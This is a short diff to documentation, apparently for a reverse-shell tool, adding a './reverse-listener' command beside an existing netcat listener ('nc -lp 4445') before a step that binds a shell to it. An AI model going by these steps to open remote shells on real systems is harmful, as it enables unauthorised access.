@@ -20,6 +20,10 @@ On the 'client' side, we create the listener :
 ```
 nc -lp 4445
 ```
+or
+```
+./reverse-listener 127.0.0.1 4445
+```
 
 On the 'server' side, we bind the shell to the listener :
 ```
